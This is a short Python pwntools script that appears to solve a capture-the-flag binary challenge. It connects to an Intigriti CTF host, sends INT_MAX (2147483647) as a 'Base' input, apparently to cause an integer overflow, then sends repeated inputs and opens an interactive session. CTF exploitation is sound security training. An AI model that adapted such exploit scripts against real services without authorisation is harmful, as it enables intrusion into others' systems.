from pwn import *

gs = '''
b *calc+314
continue
'''

elf = context.binary = ELF("./prob_y")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.sendlineafter("Base: ", b"2147483647")

for i in range(15):
    io.sendline(b"1")

io.sendline(b"1")

io.interactive()